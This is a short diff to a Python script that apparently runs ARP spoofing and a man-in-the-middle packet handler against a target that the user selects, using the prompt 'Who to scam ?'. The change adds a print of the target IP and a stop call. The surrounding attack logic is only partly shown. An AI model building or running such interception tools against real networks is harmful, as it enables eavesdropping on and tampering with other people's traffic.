@@ -13,6 +13,7 @@ for i in range(len(targets)):
 
 ans = int(input("Who to scam ? "))
 target = targets[ans].ip
+print(f"Target: {target}")
 
 a = ARPSpoofer(target)
 
@@ -31,3 +32,4 @@ def bully(pkt: Packet):
 
 
 MITM.start(bully)
+a.stop()
